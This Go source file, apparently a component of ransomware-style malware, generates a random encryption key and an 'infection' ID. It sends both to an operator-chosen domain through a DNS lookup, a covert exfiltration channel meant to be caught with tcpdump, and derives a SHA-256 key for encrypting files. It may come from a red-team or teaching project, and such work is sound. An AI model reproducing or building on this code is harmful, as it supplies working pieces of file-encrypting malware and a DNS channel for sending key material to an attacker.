package main

/*
 * key.go
 * Generate Key and ID
 * By J. Stuart McMurray
 * Created 20200411
 * Last Modified 20221005
 */

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strconv"
)

// GenerateKeyAndID generates the ID used to identify the infection and the
// encryption key used to encrypt the files.  The key is sent in key.id form
// via DNS to the domain.  GenerateKeyAndID terminates the program on error,
// but errors when sending the Key via DNS only cause a message to be logged.
func GenerateKeyAndID(domain string) (string, [32]byte) {
	/* Generate a keypair */
	key := make([]byte, 8)
	if _, err := rand.Read(key); nil != err {
		log.Fatalf("Generating key: %v", err)
	}
	id := make([]byte, 8)
	if _, err := rand.Read(id); nil != err {
		log.Fatalf("Generating ID: %v", err)
	}

	/* Send them off */
	ids := strconv.FormatUint(binary.LittleEndian.Uint64(id), 36)
	kp := fmt.Sprintf(
		"%s.%s",
		strconv.FormatUint(binary.LittleEndian.Uint64(key), 36),
		ids,
	)
	log.Printf("Decryption key: %s", kp)
	_, err := net.LookupIP(kp + "." + domain)
	if nil != err {
		/* Errors are normal if we're just using tcpdump to catch
		requests */
		log.Printf("Error sending back key and ID: %v", err)
	}

	/* The hash of the key is what we'll actually use for encryption */
	return ids, KeyFromString(kp)
}

// KeyFromString turns a string into a key.  It's really just a wrapper around
// sha256.
func KeyFromString(s string) [32]byte {
	return sha256.Sum256([]byte(s))

}
